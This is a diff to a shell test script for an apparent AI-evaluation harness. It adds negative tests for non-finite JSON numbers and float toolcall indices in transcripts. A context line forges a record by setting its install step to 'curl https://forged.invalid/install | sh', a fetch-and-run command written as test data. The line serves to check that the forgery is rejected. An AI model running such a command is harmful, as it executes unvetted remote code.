@@ -14,6 +14,12 @@ done
 base_subject="$tmp_dir/author-subject-record"
 base_checker="$tmp_dir/author-checker-record"
 
+printf '%s\n' '{"overflow":1e309}' >"$tmp_dir/overflow.json"
+assert_blocked 'non-finite JSON number' overflow-json \
+  python3 "$repo_root/docs/evaluation/gate-k-eval-validate-json.py" "$tmp_dir/overflow.json"
+assert_blocked 'non-finite JSON number' overflow-transcript \
+  python3 "$repo_root/docs/evaluation/gate-k-eval-sanitize-transcript.py" "$tmp_dir/overflow.json"
+
 cp -R "$base_checker" "$tmp_dir/reordered-lifecycle-record"
 jq -c -s '
   to_entries as $events |
@@ -172,6 +178,21 @@ write_pass_adjudication "$base_subject" "$tmp_dir/float-session-version-record" 
 assert_blocked 'Pi v3 session' finalizer-float-session-version "$finalizer" \
   "$base_subject" "$tmp_dir/float-session-version-record" \
   "$tmp_dir/float-session-version-adjudication.json" "$tmp_dir/float-session-version-run"
+
+cp -R "$base_checker" "$tmp_dir/float-toolcall-index-record"
+awk '
+  !changed && /"type":"toolcall_end"/ {
+    sub(/"contentIndex":[0-9]+/, "&.0")
+    changed=1
+  }
+  {print}
+' "$base_checker/transcript.ndjson" >"$tmp_dir/float-toolcall-index-record/transcript.ndjson"
+refresh_record_transcript_evidence "$tmp_dir/float-toolcall-index-record"
+write_pass_adjudication "$base_subject" "$tmp_dir/float-toolcall-index-record" \
+  "$tmp_dir/float-toolcall-index-adjudication.json"
+assert_blocked 'contentIndex is invalid' finalizer-float-toolcall-index "$finalizer" \
+  "$base_subject" "$tmp_dir/float-toolcall-index-record" \
+  "$tmp_dir/float-toolcall-index-adjudication.json" "$tmp_dir/float-toolcall-index-run"
 
 cp -R "$base_checker" "$tmp_dir/forged-qualification-record"
 sed 's#^PI_INSTALL .*#PI_INSTALL curl https://forged.invalid/install | sh#' \
